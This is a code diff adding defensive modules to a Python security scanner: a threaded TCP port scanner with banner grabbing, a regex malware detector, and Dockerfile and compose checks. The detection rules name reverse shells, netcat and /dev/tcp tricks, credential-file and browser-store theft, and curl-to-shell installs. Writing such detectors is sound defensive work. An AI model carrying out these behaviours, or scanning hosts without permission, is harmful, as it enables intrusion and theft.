@@ -4144,6 +4144,1548 @@ def slugify(text):
 ]
 
 # ==============================================================================
+# ==============================================================================
+#  ADVANCED MODULE PACK — Network Scanner, Malware Detector, Container Security,
+#  Compliance Auditor, Code Quality Engine, Attack Surface Mapper,
+#  Security Posture Scorer, and Threat Hunter
+# ==============================================================================
+# ==============================================================================
+# ==============================================================================
+# ==============================================================================
+#  MODULE: ADVANCED NETWORK PORT SCANNER
+#  TCP port scan with service fingerprinting, banner grabbing, and risk scoring.
+#  WARNING: Only scan hosts you own or have written permission to test.
+# ==============================================================================
+# ==============================================================================
+
+import ipaddress as _ipaddress
+
+WELL_KNOWN_SERVICES: Dict[int, Tuple[str, str, str]] = {
+    21:    ("FTP",              "Critical", "FTP sends credentials in cleartext. Replace with SFTP/FTPS immediately."),
+    22:    ("SSH",              "Low",      "SSH is secure if configured: disable root login, enforce key auth, use fail2ban."),
+    23:    ("Telnet",           "Critical", "Telnet sends all traffic including credentials in cleartext. Disable immediately."),
+    25:    ("SMTP",             "Medium",   "Open SMTP relay may allow spam. Enforce authentication."),
+    53:    ("DNS",              "Low",      "Open DNS resolver can be abused for amplification attacks. Restrict recursion."),
+    69:    ("TFTP",             "Critical", "TFTP has no authentication. Disable if not required."),
+    80:    ("HTTP",             "Medium",   "Unencrypted HTTP. Redirect to HTTPS and enforce HSTS."),
+    110:   ("POP3",             "High",     "POP3 sends credentials in cleartext. Use POP3S (port 995)."),
+    111:   ("RPCBind",          "High",     "RPCBind/portmapper should not be exposed to the internet."),
+    135:   ("MSRPC",            "High",     "Windows RPC should not be exposed externally."),
+    137:   ("NetBIOS-NS",       "Critical", "NetBIOS exposes system info. Block at firewall."),
+    139:   ("NetBIOS-SMB",      "Critical", "NetBIOS/SMB should never be internet-exposed."),
+    143:   ("IMAP",             "High",     "IMAP sends credentials in cleartext. Use IMAPS (port 993)."),
+    161:   ("SNMP",             "High",     "SNMP v1/v2 uses community strings instead of passwords. Use SNMPv3."),
+    389:   ("LDAP",             "High",     "LDAP without TLS exposes directory data. Use LDAPS (port 636)."),
+    443:   ("HTTPS",            "Low",      "HTTPS is correct. Verify TLS config in the SSL Analyzer tab."),
+    445:   ("SMB",              "Critical", "SMB should NEVER be internet-exposed. EternalBlue/WannaCry attack vector."),
+    465:   ("SMTPS",            "Low",      "SMTPS — verify TLS configuration and certificate."),
+    514:   ("Syslog",           "Medium",   "Syslog UDP may leak sensitive log data to the internet."),
+    587:   ("SMTP-Submission",  "Low",      "SMTP submission — verify STARTTLS and authentication requirements."),
+    636:   ("LDAPS",            "Low",      "LDAPS — verify certificate and TLS version."),
+    873:   ("rsync",            "Critical", "rsync without authentication allows arbitrary file read/write."),
+    993:   ("IMAPS",            "Low",      "IMAPS — verify TLS configuration."),
+    995:   ("POP3S",            "Low",      "POP3S — verify TLS configuration."),
+    1080:  ("SOCKS-Proxy",      "High",     "SOCKS proxy — verify authentication to prevent open-proxy abuse."),
+    1433:  ("MSSQL",            "Critical", "SQL Server should never be internet-exposed."),
+    1521:  ("Oracle-DB",        "Critical", "Oracle DB should never be internet-exposed."),
+    2049:  ("NFS",              "Critical", "NFS should never be internet-exposed — allows full filesystem access."),
+    2181:  ("ZooKeeper",        "Critical", "ZooKeeper has no auth by default — internet exposure allows cluster control."),
+    2375:  ("Docker-API-HTTP",  "Critical", "Docker daemon without TLS — internet exposure = full host compromise."),
+    2376:  ("Docker-API-TLS",   "Medium",   "Docker daemon with TLS — verify mutual certificate authentication."),
+    2379:  ("etcd",             "Critical", "etcd stores all Kubernetes secrets — never expose to internet."),
+    3000:  ("Web-App",          "Low",      "Development server or Node.js app — verify this is intentional."),
+    3306:  ("MySQL",            "Critical", "MySQL should never be internet-exposed."),
+    3389:  ("RDP",              "Critical", "RDP should NEVER be internet-exposed. BlueKeep/DejaBlue attack vector."),
+    4444:  ("Metasploit-Handler","Critical","Default Metasploit listener port — investigate immediately."),
+    4848:  ("GlassFish-Admin",  "High",     "GlassFish admin console should not be internet-exposed."),
+    5000:  ("Flask/Registry",   "Medium",   "Possible Flask dev server or Docker registry — verify intent."),
+    5432:  ("PostgreSQL",       "Critical", "PostgreSQL should never be internet-exposed."),
+    5601:  ("Kibana",           "High",     "Kibana should not be internet-exposed without authentication."),
+    5900:  ("VNC",              "Critical", "VNC should never be internet-exposed. Use VPN + SSH tunnel instead."),
+    5984:  ("CouchDB",          "High",     "CouchDB admin interface should not be internet-exposed."),
+    6379:  ("Redis",            "Critical", "Redis has no auth by default. Internet exposure = RCE + full data access."),
+    6443:  ("Kubernetes-API",   "Critical", "Kubernetes API server — restrict to control plane only, enforce RBAC."),
+    7001:  ("WebLogic",         "Critical", "WebLogic has multiple critical RCE CVEs. Patch and restrict access."),
+    7474:  ("Neo4j-Browser",    "High",     "Neo4j browser/bolt should not be internet-exposed."),
+    8080:  ("HTTP-Alt",         "Medium",   "Alternative HTTP — may expose admin interfaces or dev servers."),
+    8443:  ("HTTPS-Alt",        "Low",      "Alternative HTTPS port."),
+    8888:  ("Jupyter",          "Critical", "Jupyter Notebook without auth = full remote code execution."),
+    9000:  ("PHP-FPM/Sonar",    "High",     "PHP-FPM or SonarQube — verify authentication and restrict access."),
+    9092:  ("Kafka",            "High",     "Kafka without auth allows topic enumeration and message interception."),
+    9200:  ("Elasticsearch",    "Critical", "Elasticsearch without auth exposes ALL data. Never internet-expose."),
+    9300:  ("ES-Cluster",       "Critical", "Elasticsearch cluster transport — restrict to internal network only."),
+    10250: ("Kubelet",          "Critical", "Kubernetes kubelet API — internet exposure allows pod/container control."),
+    10255: ("Kubelet-RO",       "High",     "Kubernetes kubelet read-only port — leaks cluster metadata."),
+    27017: ("MongoDB",          "Critical", "MongoDB should never be internet-exposed."),
+    27018: ("MongoDB-Shard",    "Critical", "MongoDB shard — restrict to internal network."),
+    27019: ("MongoDB-Config",   "Critical", "MongoDB config server — restrict to internal network."),
+    50070: ("Hadoop-NameNode",  "Critical", "Hadoop NameNode web UI should not be internet-exposed."),
+    50075: ("Hadoop-DataNode",  "Critical", "Hadoop DataNode web UI should not be internet-exposed."),
+}
+
+
+@dataclass
+class PortScanResult:
+    host: str
+    port: int
+    is_open: bool
+    service_name: str
+    banner: str
+    risk_level: str
+    risk_note: str
+    response_time_ms: float
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "host": self.host, "port": self.port, "is_open": self.is_open,
+            "service": self.service_name, "banner": self.banner[:80],
+            "risk": self.risk_level, "note": self.risk_note,
+            "response_ms": round(self.response_time_ms, 1),
+        }
+
+
+@dataclass
+class NetworkScanReport:
+    host: str
+    scan_time: str
+    open_ports: List[PortScanResult]
+    total_scanned: int
+    critical_count: int
+    high_count: int
+    overall_risk: str
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "host": self.host, "scan_time": self.scan_time,
+            "total_scanned": self.total_scanned, "open_count": len(self.open_ports),
+            "critical": self.critical_count, "high": self.high_count,
+            "overall_risk": self.overall_risk,
+            "open_ports": [p.to_dict() for p in self.open_ports],
+        }
+
+
+class AdvancedNetworkScanner:
+    """
+    TCP port scanner with service fingerprinting, banner grabbing, and structured
+    risk scoring. Uses a thread pool for speed. Scan only hosts you own or have
+    explicit written permission to test.
+    """
+
+    def _grab_banner(self, sock: socket.socket) -> str:
+        try:
+            sock.settimeout(1.0)
+            for probe in [b"HEAD / HTTP/1.0\r\n\r\n", b"\r\n", b""]:
+                try:
+                    if probe:
+                        sock.send(probe)
+                    raw = sock.recv(512)
+                    if raw:
+                        return raw.decode("utf-8", errors="replace").strip()[:200]
+                except Exception:
+                    continue
+        except Exception:
+            pass
+        return ""
+
+    def scan_port(self, host: str, port: int, timeout: float = 2.0) -> PortScanResult:
+        info = WELL_KNOWN_SERVICES.get(port, (f"Unknown-{port}", "Low", "Unknown service — investigate."))
+        service_name, risk_level, risk_note = info
+        start = time.time()
+        try:
+            with socket.create_connection((host, port), timeout=timeout) as sock:
+                elapsed = (time.time() - start) * 1000
+                banner = self._grab_banner(sock)
+                return PortScanResult(
+                    host=host, port=port, is_open=True,
+                    service_name=service_name, banner=banner,
+                    risk_level=risk_level, risk_note=risk_note,
+                    response_time_ms=elapsed,
+                )
+        except Exception:
+            elapsed = (time.time() - start) * 1000
+            return PortScanResult(
+                host=host, port=port, is_open=False,
+                service_name=service_name, banner="",
+                risk_level="OK", risk_note="Port closed.",
+                response_time_ms=elapsed,
+            )
+
+    def scan_host(self, host: str, ports: Optional[List[int]] = None,
+                  timeout: float = 2.0, max_workers: int = 60) -> NetworkScanReport:
+        scan_ports = ports or list(WELL_KNOWN_SERVICES.keys())
+        results: List[PortScanResult] = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
+            futures = {pool.submit(self.scan_port, host, p, timeout): p for p in scan_ports}
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    results.append(future.result())
+                except Exception:
+                    pass
+        open_ports = sorted([r for r in results if r.is_open], key=lambda r: r.port)
+        critical = sum(1 for r in open_ports if r.risk_level == "Critical")
+        high = sum(1 for r in open_ports if r.risk_level == "High")
+        if critical:
+            risk = "Critical"
+        elif high:
+            risk = "High"
+        elif open_ports:
+            risk = "Medium"
+        else:
+            risk = "Low"
+        return NetworkScanReport(
+            host=host, scan_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            open_ports=open_ports, total_scanned=len(scan_ports),
+            critical_count=critical, high_count=high, overall_risk=risk,
+        )
+
+    @staticmethod
+    def validate_target(target: str) -> Tuple[bool, str]:
+        """Reject obviously invalid targets; warn on private ranges."""
+        try:
+            addr = _ipaddress.ip_address(target)
+            if addr.is_loopback:
+                return True, "loopback"
+            if addr.is_private:
+                return True, "private"
+            return True, "public"
+        except ValueError:
+            pass
+        if re.match(r"^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$", target):
+            return True, "hostname"
+        return False, "invalid"
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: MALWARE & OBFUSCATION PATTERN DETECTOR
+#  Detects shellcode, cryptominers, backdoors, reverse shells, obfuscated code,
+#  and data-exfiltration patterns in source files.
+# ==============================================================================
+# ==============================================================================
+
+@dataclass
+class MalwareFinding:
+    finding_id: str
+    file_name: str
+    line_number: int
+    pattern_name: str
+    category: str
+    severity: str
+    matched_snippet: str
+    explanation: str
+    recommendation: str
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "finding_id": self.finding_id, "file_name": self.file_name,
+            "line_number": self.line_number, "pattern": self.pattern_name,
+            "category": self.category, "severity": self.severity,
+            "snippet": self.matched_snippet[:120], "explanation": self.explanation,
+            "recommendation": self.recommendation,
+        }
+
+
+MALWARE_PATTERNS: List[Dict[str, Any]] = [
+    # ── Reverse shells ────────────────────────────────────────────────────────
+    {"id": "MAL-001", "name": "Python reverse shell (socket+exec)", "category": "Reverse Shell",
+     "severity": "Critical", "pattern": r"\.connect\s*\(\s*\([^)]*\)\s*\)[\s\S]{0,300}\bexec\s*\(",
+     "explanation": "Classic Python reverse shell: connects to a remote host and executes received commands.",
+     "recommendation": "Remove immediately. Investigate how this code was introduced. Check git history."},
+    {"id": "MAL-002", "name": "Bash reverse shell via subprocess", "category": "Reverse Shell",
+     "severity": "Critical", "pattern": r"subprocess\.[^(]+\(['\"]bash.{0,30}-i.{0,30}>.*?/dev/tcp",
+     "explanation": "Bash -i with /dev/tcp redirection is a classic interactive reverse shell.",
+     "recommendation": "Remove immediately. Full incident response required."},
+    {"id": "MAL-003", "name": "nc/ncat reverse shell", "category": "Reverse Shell",
+     "severity": "Critical", "pattern": r"['\"]nc['\"]|['\"]ncat['\"]|['\"]netcat['\"].*[-]e.*['\"](?:/bin/sh|/bin/bash|cmd\.exe)['\"]",
+     "explanation": "Netcat with -e flag creates a reverse shell by piping a shell to a remote connection.",
+     "recommendation": "Remove immediately. Full incident response required."},
+    {"id": "MAL-004", "name": "mkfifo-based reverse shell", "category": "Reverse Shell",
+     "severity": "Critical", "pattern": r"mkfifo.*bash.*nc|nc.*bash.*mkfifo",
+     "explanation": "Named-pipe (mkfifo) reverse shell — a common bypass for environments where nc -e is disabled.",
+     "recommendation": "Remove immediately. Full incident response required."},
+    # ── Obfuscation ───────────────────────────────────────────────────────────
+    {"id": "MAL-005", "name": "Base64 decode + exec chain", "category": "Obfuscation",
+     "severity": "Critical", "pattern": r"base64\.b64decode\s*\([^)]+\)\s*[\s\S]{0,50}\bexec\b|\beval\b",
+     "explanation": "Decoding a base64 payload and immediately executing it hides malicious code from static analysis.",
+     "recommendation": "Decode and inspect the payload. Remove if malicious. Never execute decoded external data."},
+    {"id": "MAL-006", "name": "Hex-encoded payload execution", "category": "Obfuscation",
+     "severity": "Critical", "pattern": r"bytes\.fromhex\s*\(['\"][0-9a-fA-F]{32,}['\"]\)\s*[\s\S]{0,50}\bexec\b",
+     "explanation": "Hex-encoded bytes decoded and executed — classic malware obfuscation technique.",
+     "recommendation": "Decode and inspect. Remove if malicious."},
+    {"id": "MAL-007", "name": "Compressed payload execution", "category": "Obfuscation",
+     "severity": "Critical", "pattern": r"(zlib\.decompress|gzip\.decompress|bz2\.decompress)\s*\(.*\)\s*[\s\S]{0,80}\bexec\b",
+     "explanation": "Compressed payload decompressed and executed — evades string-based scanners.",
+     "recommendation": "Decompress and inspect the payload. Remove if malicious."},
+    {"id": "MAL-008", "name": "Dynamic attribute access for import evasion", "category": "Obfuscation",
+     "severity": "High", "pattern": r"__import__\s*\([^)]{0,50}\)|getattr\s*\(__builtins__",
+     "explanation": "Using __import__ or getattr on builtins to import modules without a visible import statement, evading static analysis.",
+     "recommendation": "Replace with explicit imports. If this pattern was added unexpectedly, investigate."},
+    {"id": "MAL-009", "name": "ROT13/XOR obfuscation", "category": "Obfuscation",
+     "severity": "High", "pattern": r"codecs\.decode\s*\([^)]*['\"]rot[_-]?13['\"]|lambda\s+\w+\s*:\s*chr\s*\(\s*ord\s*\(",
+     "explanation": "ROT13 or XOR character-rotation used to hide string literals from static analysis.",
+     "recommendation": "Decode and inspect hidden strings. Remove obfuscation; use plain strings."},
+    # ── Cryptominers ──────────────────────────────────────────────────────────
+    {"id": "MAL-010", "name": "Monero mining pool connection", "category": "Cryptominer",
+     "severity": "Critical", "pattern": r"(xmr|monero|pool\.minexmr|gulf\.moneroocean|xmrig)",
+     "explanation": "References to Monero mining infrastructure — indicative of a cryptominer.",
+     "recommendation": "Remove immediately. Audit CPU usage history. Check for persistence mechanisms."},
+    {"id": "MAL-011", "name": "Mining stratum protocol usage", "category": "Cryptominer",
+     "severity": "Critical", "pattern": r"stratum\+tcp://|stratum\+ssl://",
+     "explanation": "Stratum protocol is used exclusively for cryptocurrency mining pool communication.",
+     "recommendation": "Remove immediately. Full system audit required."},
+    {"id": "MAL-012", "name": "XMRig / known miner binary", "category": "Cryptominer",
+     "severity": "Critical", "pattern": r"\bxmrig\b|\bminerd\b|\bcgminer\b|\bbfgminer\b",
+     "explanation": "Reference to a known cryptocurrency mining executable.",
+     "recommendation": "Remove immediately. Audit for persistence and lateral movement."},
+    # ── Backdoors ─────────────────────────────────────────────────────────────
+    {"id": "MAL-013", "name": "Bind shell listener", "category": "Backdoor",
+     "severity": "Critical", "pattern": r"socket\.bind\s*\(.*\)\s*[\s\S]{0,300}os\.(exec|system|popen)",
+     "explanation": "Socket bound to a port with OS command execution — a classic bind shell backdoor.",
+     "recommendation": "Remove immediately. Full incident response required."},
+    {"id": "MAL-014", "name": "SSH authorized_keys modification", "category": "Backdoor",
+     "severity": "Critical", "pattern": r"authorized_keys|\.ssh/authorized",
+     "explanation": "Programmatic modification of SSH authorized_keys establishes persistent backdoor access.",
+     "recommendation": "Remove immediately. Audit SSH keys. Rotate all credentials."},
+    {"id": "MAL-015", "name": "Crontab persistence mechanism", "category": "Backdoor",
+     "severity": "High", "pattern": r"(crontab\s+-[le]|/etc/cron\.[dw]|/var/spool/cron)",
+     "explanation": "Programmatic crontab modification or cron.d file writing is a common persistence mechanism.",
+     "recommendation": "Verify this cron modification is legitimate. Audit all cron jobs."},
+    {"id": "MAL-016", "name": "Systemd service installation", "category": "Backdoor",
+     "severity": "High", "pattern": r"/etc/systemd/system/.*\.service|systemctl\s+enable",
+     "explanation": "Programmatic systemd service creation/enablement can establish persistent backdoor services.",
+     "recommendation": "Verify this service modification is legitimate and intentional."},
+    # ── Data exfiltration ─────────────────────────────────────────────────────
+    {"id": "MAL-017", "name": "DNS-based data exfiltration pattern", "category": "Data Exfiltration",
+     "severity": "High", "pattern": r"socket\.(getaddrinfo|gethostbyname)\s*\([^)]*base64|dns.*exfil",
+     "explanation": "DNS lookups with base64-encoded data in subdomains are used for covert data exfiltration.",
+     "recommendation": "Remove immediately. Audit network traffic for unusual DNS query patterns."},
+    {"id": "MAL-018", "name": "Credentials dumping from /etc/passwd or /etc/shadow", "category": "Data Exfiltration",
+     "severity": "Critical", "pattern": r"open\s*\(\s*['\"]\/etc\/(passwd|shadow|sudoers)['\"]",
+     "explanation": "Reading /etc/shadow or /etc/passwd programmatically is a credential harvesting technique.",
+     "recommendation": "Remove immediately. Rotate all system credentials. Full incident response required."},
+    {"id": "MAL-019", "name": "Browser credential store access", "category": "Data Exfiltration",
+     "severity": "Critical", "pattern": r"(Login Data|Cookies|Web Data|key4\.db|logins\.json|wallet\.dat)",
+     "explanation": "References to browser credential/cookie/crypto wallet stores — credential stealer indicator.",
+     "recommendation": "Remove immediately. Assume credentials are compromised. Full incident response."},
+    {"id": "MAL-020", "name": "Environment variable mass exfiltration", "category": "Data Exfiltration",
+     "severity": "High", "pattern": r"os\.environ\.items\(\)|dict\(os\.environ\)",
+     "explanation": "Collecting ALL environment variables at once may indicate credential exfiltration (API keys, tokens, etc.).",
+     "recommendation": "Replace with targeted os.environ.get('SPECIFIC_VAR') calls for only the vars you need."},
+    # ── Process injection / privilege escalation ───────────────────────────────
+    {"id": "MAL-021", "name": "ptrace-based process injection", "category": "Process Injection",
+     "severity": "Critical", "pattern": r"ptrace|PTRACE_ATTACH|PTRACE_POKETEXT",
+     "explanation": "ptrace is used for debugger attachment and is abused for process injection and credential theft.",
+     "recommendation": "Remove if not part of a legitimate debugger. Investigate origin."},
+    {"id": "MAL-022", "name": "setuid/setgid privilege escalation", "category": "Privilege Escalation",
+     "severity": "High", "pattern": r"os\.setuid\s*\(\s*0\s*\)|os\.setgid\s*\(\s*0\s*\)|os\.setreuid\s*\(\s*0",
+     "explanation": "Programmatic setuid(0) attempts to escalate to root privileges.",
+     "recommendation": "Verify this is intentional and required. If unexpected, full incident response."},
+    {"id": "MAL-023", "name": "SUID binary creation", "category": "Privilege Escalation",
+     "severity": "Critical", "pattern": r"os\.chmod\s*\([^)]*(?:0o[46][0-9]{3}|0[46][0-9]{3})",
+     "explanation": "Setting SUID bit (4xxx) on a file allows it to run as its owner (potentially root).",
+     "recommendation": "SUID binaries are a common persistence and privilege escalation mechanism. Audit carefully."},
+    # ── Network scanning / C2 ─────────────────────────────────────────────────
+    {"id": "MAL-024", "name": "Port scanner implementation", "category": "Network Reconnaissance",
+     "severity": "Medium", "pattern": r"for\s+\w+\s+in\s+range\s*\(\s*1\s*,\s*(?:65[0-9]{3}|655[0-3][0-9])",
+     "explanation": "Iterating over the full TCP port range suggests an embedded port scanner.",
+     "recommendation": "If this is a legitimate network tool, document and restrict its use. Otherwise investigate."},
+    {"id": "MAL-025", "name": "Hardcoded C2 IP/domain", "category": "Command and Control",
+     "severity": "Critical", "pattern": r"(?:185\.220\.|45\.33\.|89\.248\.|194\.26\.|91\.240\.)\d{1,3}\.\d{1,3}",
+     "explanation": "IP address matching known malicious/TOR exit node ranges hardcoded in source.",
+     "recommendation": "Remove immediately. Treat this system as compromised. Full incident response."},
+]
+
+
+class MalwarePatternScanner:
+    """
+    Detects malware-indicative patterns in source code including reverse shells,
+    obfuscated payloads, cryptominers, backdoors, and data-exfiltration code.
+    Uses multi-line regex matching so multi-statement patterns like
+    'connect then exec' are detected even across lines.
+    """
+
+    def __init__(self, rules: Optional[List[Dict[str, Any]]] = None):
+        self.rules = rules or MALWARE_PATTERNS
+        self._compiled = []
+        for rule in self.rules:
+            try:
+                self._compiled.append((rule, re.compile(rule["pattern"], re.MULTILINE | re.DOTALL)))
+            except re.error:
+                pass
+
+    def scan(self, file_name: str, content: str) -> List[MalwareFinding]:
+        findings: List[MalwareFinding] = []
+        lines = content.splitlines()
+        seen: Set[Tuple[str, int]] = set()
+        for rule, compiled in self._compiled:
+            for match in compiled.finditer(content):
+                line_no = content[: match.start()].count("\n") + 1
+                key = (rule["id"], line_no)
+                if key in seen:
+                    continue
+                seen.add(key)
+                snippet = lines[line_no - 1].strip()[:120] if 0 < line_no <= len(lines) else match.group(0)[:80]
+                findings.append(MalwareFinding(
+                    finding_id=f"{file_name}:{line_no}:{rule['id']}",
+                    file_name=file_name, line_number=line_no,
+                    pattern_name=rule["name"], category=rule["category"],
+                    severity=rule["severity"], matched_snippet=snippet,
+                    explanation=rule["explanation"], recommendation=rule["recommendation"],
+                ))
+        return findings
+
+    def scan_files(self, files: Dict[str, str]) -> List[MalwareFinding]:
+        all_findings: List[MalwareFinding] = []
+        for name, content in files.items():
+            all_findings.extend(self.scan(name, content))
+        return all_findings
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: CONTAINER SECURITY ANALYZER
+#  Deep analysis of Dockerfiles, docker-compose.yml, and Kubernetes manifests.
+#  40+ security checks covering least-privilege, secrets, network, and more.
+# ==============================================================================
+# ==============================================================================
+
+@dataclass
+class ContainerFinding:
+    finding_id: str
+    file_name: str
+    line_number: int
+    check_id: str
+    title: str
+    severity: str
+    category: str
+    detail: str
+    recommendation: str
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "finding_id": self.finding_id, "file_name": self.file_name,
+            "line_number": self.line_number, "check_id": self.check_id,
+            "title": self.title, "severity": self.severity,
+            "category": self.category, "detail": self.detail,
+            "recommendation": self.recommendation,
+        }
+
+
+DOCKERFILE_CHECKS: List[Dict[str, Any]] = [
+    {"id": "DCK-001", "title": "Running as root (explicit USER root)", "severity": "High", "category": "Privilege",
+     "pattern": r"(?im)^\s*USER\s+root\s*$",
+     "detail": "Container runs as root, maximising blast radius on compromise.",
+     "rec": "Add a non-root USER (e.g. USER appuser:appgroup) before the final CMD/ENTRYPOINT."},
+    {"id": "DCK-002", "title": "No USER instruction (default root)", "severity": "Medium", "category": "Privilege",
+     "pattern": None, "check_fn": lambda c: "USER" not in c.upper(),
+     "detail": "No USER instruction means the container runs as root by default.",
+     "rec": "Add: RUN adduser --disabled-password appuser && USER appuser"},
+    {"id": "DCK-003", "title": "Latest tag used for base image", "severity": "Medium", "category": "Supply Chain",
+     "pattern": r"(?im)^\s*FROM\s+[^\s]+:latest\b",
+     "detail": "':latest' is mutable — the image pulled can change between builds, breaking reproducibility.",
+     "rec": "Pin to a specific digest: FROM node:20.11.0-alpine3.19@sha256:<digest>"},
+    {"id": "DCK-004", "title": "Secrets in ENV instruction", "severity": "Critical", "category": "Secrets",
+     "pattern": r"(?im)^\s*ENV\s+[^\n]*(PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY|PASSWD|CREDENTIAL)[^\n]*",
+     "detail": "Secrets in ENV instructions are baked into the image layer and visible via 'docker inspect'.",
+     "rec": "Use Docker secrets, environment injection at runtime, or a secrets manager. Never bake secrets into images."},
+    {"id": "DCK-005", "title": "Secrets in ARG instruction", "severity": "High", "category": "Secrets",
+     "pattern": r"(?im)^\s*ARG\s+[^\n]*(PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY)[^\n]*",
+     "detail": "ARG values are stored in image history and visible via 'docker history --no-trunc'.",
+     "rec": "Use multi-stage builds and inject secrets at runtime, not build time."},
+    {"id": "DCK-006", "title": "Copying .ssh or secret directories into image", "severity": "Critical", "category": "Secrets",
+     "pattern": r"(?im)^\s*(COPY|ADD)\s+[^\n]*(\.ssh|\.aws|\.gnupg|\.config/gcloud|\.kube/config)[^\n]*",
+     "detail": "SSH keys, AWS credentials, or other secrets are being copied into the image.",
+     "rec": "Never copy credential directories into images. Use runtime secret injection."},
+    {"id": "DCK-007", "title": "Using ADD for local files (prefer COPY)", "severity": "Low", "category": "Best Practice",
+     "pattern": r"(?im)^\s*ADD\s+(?!https?://)\S+\s+",
+     "detail": "ADD auto-extracts tarballs and has implicit URL-fetch behaviour that COPY lacks.",
+     "rec": "Use COPY for local files. Reserve ADD only for its specific URL/tar extraction use cases."},
+    {"id": "DCK-008", "title": "COPY/ADD of entire build context (.)", "severity": "Medium", "category": "Supply Chain",
+     "pattern": r"(?im)^\s*(COPY|ADD)\s+\.\s+",
+     "detail": "Copying the entire build context may include .git, node_modules, .env, or other sensitive files.",
+     "rec": "Use a .dockerignore file to exclude .git, .env, credentials, and other unneeded files."},
+    {"id": "DCK-009", "title": "curl/wget piped to shell", "severity": "Critical", "category": "Supply Chain",
+     "pattern": r"(?im)(curl|wget)[^\n]+\|\s*(bash|sh|python)",
+     "detail": "Piping downloaded scripts directly to a shell is a supply-chain attack vector.",
+     "rec": "Download the script, verify its checksum/signature, then execute it separately."},
+    {"id": "DCK-010", "title": "Package install without version pinning", "severity": "Medium", "category": "Supply Chain",
+     "pattern": r"(?im)(apt-get|apk|yum|dnf)\s+install\s+(?!.*=)[^\n]{3,}",
+     "detail": "Installing packages without version pinning makes builds non-reproducible.",
+     "rec": "Pin package versions: apt-get install nginx=1.24.0-1"},
+    {"id": "DCK-011", "title": "Missing HEALTHCHECK instruction", "severity": "Low", "category": "Resilience",
+     "pattern": None, "check_fn": lambda c: "HEALTHCHECK" not in c.upper(),
+     "detail": "Without HEALTHCHECK, orchestrators cannot detect application-level failures.",
+     "rec": "Add: HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost/health || exit 1"},
+    {"id": "DCK-012", "title": "Port 22 (SSH) exposed in container", "severity": "High", "category": "Network",
+     "pattern": r"(?im)^\s*EXPOSE\s+22\b",
+     "detail": "Exposing SSH inside a container goes against the immutable container principle and increases attack surface.",
+     "rec": "Remove EXPOSE 22. Access containers via 'docker exec' or orchestrator exec facilities."},
+    {"id": "DCK-013", "title": "Running apt-get without cleanup", "severity": "Low", "category": "Best Practice",
+     "pattern": r"(?im)apt-get\s+install(?![\s\S]*rm\s+-rf\s+/var/lib/apt)",
+     "detail": "Leaving apt caches in the image increases image size and may expose package metadata.",
+     "rec": "Always run: && rm -rf /var/lib/apt/lists/* after apt-get install"},
+    {"id": "DCK-014", "title": "apk add without --no-cache", "severity": "Low", "category": "Best Practice",
+     "pattern": r"(?im)apk\s+add(?!\s+--no-cache)",
+     "detail": "Missing --no-cache leaves package index in the image layer, unnecessarily increasing size.",
+     "rec": "Use: apk add --no-cache <packages>"},
+    {"id": "DCK-015", "title": "Multiple RUN instructions (should be combined)", "severity": "Low", "category": "Best Practice",
+     "pattern": None,
+     "check_fn": lambda c: len(re.findall(r"(?im)^\s*RUN\s", c)) > 5,
+     "detail": "Many separate RUN instructions create many layers, increasing image size.",
+     "rec": "Combine RUN instructions with && to minimize layers."},
+]
+
+COMPOSE_CHECKS: List[Dict[str, Any]] = [
+    {"id": "CMP-001", "title": "Privileged container mode", "severity": "Critical", "category": "Privilege",
+     "pattern": r"privileged:\s*true",
+     "detail": "Privileged containers have full host access — equivalent to running as root on the host.",
+     "rec": "Remove 'privileged: true'. Use specific capabilities instead (cap_add)."},
+    {"id": "CMP-002", "title": "Mounting Docker socket", "severity": "Critical", "category": "Privilege",
+     "pattern": r"/var/run/docker\.sock",
+     "detail": "Mounting the Docker socket gives the container full control over all containers on the host.",
+     "rec": "Do not mount the Docker socket unless absolutely necessary. Use a Docker proxy with restricted permissions."},
+    {"id": "CMP-003", "title": "Host network mode", "severity": "High", "category": "Network",
+     "pattern": r"network_mode:\s*['\"]?host['\"]?",
+     "detail": "Host network mode bypasses Docker network isolation, sharing the host's network namespace.",
+     "rec": "Use bridge networking and expose only the specific ports needed."},
+    {"id": "CMP-004", "title": "PID namespace sharing (pid: host)", "severity": "High", "category": "Privilege",
+     "pattern": r"pid:\s*['\"]?host['\"]?",
+     "detail": "Sharing the host PID namespace allows containers to see and interact with host processes.",
+     "rec": "Remove 'pid: host' unless required for specific debugging scenarios."},
+    {"id": "CMP-005", "title": "Hardcoded secrets in environment section", "severity": "Critical", "category": "Secrets",
+     "pattern": r"(?i)(PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY)\s*[:=]\s*[^\n]{4,}",
+     "detail": "Hardcoded credentials in docker-compose.yml are committed to source control in plaintext.",
+     "rec": "Use .env files (excluded from git) or Docker secrets. Reference as: ${MY_SECRET}"},
+    {"id": "CMP-006", "title": "No resource limits defined", "severity": "Medium", "category": "Resilience",
+     "pattern": None, "check_fn": lambda c: "mem_limit" not in c and "memory:" not in c,
+     "detail": "Without memory/CPU limits, a compromised or buggy container can exhaust host resources (DoS).",
+     "rec": "Add deploy.resources.limits.memory and cpus to each service."},
+    {"id": "CMP-007", "title": "Binding to 0.0.0.0 (all interfaces)", "severity": "Medium", "category": "Network",
+     "pattern": r"['\"]?0\.0\.0\.0:\d+:\d+['\"]?",
+     "detail": "Binding to 0.0.0.0 exposes the port on all network interfaces including public ones.",
+     "rec": "Bind to a specific interface: '127.0.0.1:8080:8080' for local-only services."},
+    {"id": "CMP-008", "title": "No restart policy defined", "severity": "Low", "category": "Resilience",
+     "pattern": None, "check_fn": lambda c: "restart:" not in c,
+     "detail": "Without a restart policy, containers won't automatically recover from crashes.",
+     "rec": "Add: restart: unless-stopped (or 'on-failure' for one-shot tasks)."},
+]
+
+K8S_CHECKS: List[Dict[str, Any]] = [
